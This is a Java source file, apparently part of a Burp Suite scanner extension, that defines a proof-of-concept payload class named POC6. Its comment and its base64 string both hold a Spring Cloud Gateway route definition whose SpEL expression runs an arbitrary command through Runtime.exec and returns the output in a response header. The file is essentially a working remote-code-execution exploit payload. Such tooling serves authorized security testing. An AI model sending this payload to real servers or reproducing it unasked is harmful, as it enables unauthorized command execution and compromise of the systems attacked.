package burp.payload.pocs;

import burp.payload.IPoc;

/**
 * @author : metaStor
 * @date : Created 2022/4/11 9:01 PM
 * @description:base64 encode payload (两个占位符)
 *  * {
 * "id": "%s",
 * "filters": [{
 * "name": "AddResponseHeader",
 * "args": {"name": "Result","value": "#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"%s\"}).getInputStream()))}"}
 * }],
 * "uri": "http://example.com",
 * "order": 0
 * }
 * */
public class POC6 implements IPoc {

    @Override
    public String genPoc() {
        return "eyJpZCI6ICIlcyIsImZpbHRlcnMiOiBbeyJuYW1lIjogIkFkZFJlc3BvbnNlSGVhZGVyIiwiYXJncyI6IHsibmFtZSI6ICJSZXN1bHQiLCJ2YWx1ZSI6ICIje25ldyBqYXZhLmxhbmcuU3RyaW5nKFQob3JnLnNwcmluZ2ZyYW1ld29yay51dGlsLlN0cmVhbVV0aWxzKS5jb3B5VG9CeXRlQXJyYXkoVChqYXZhLmxhbmcuUnVudGltZSkuZ2V0UnVudGltZSgpLmV4ZWMobmV3IFN0cmluZ1tde1wiJXNcIn0pLmdldElucHV0U3RyZWFtKCkpKX0ifX1dLCJ1cmkiOiAiaHR0cDovL2V4YW1wbGUuY29tIiwib3JkZXIiOiAwfQ==";
    }
}
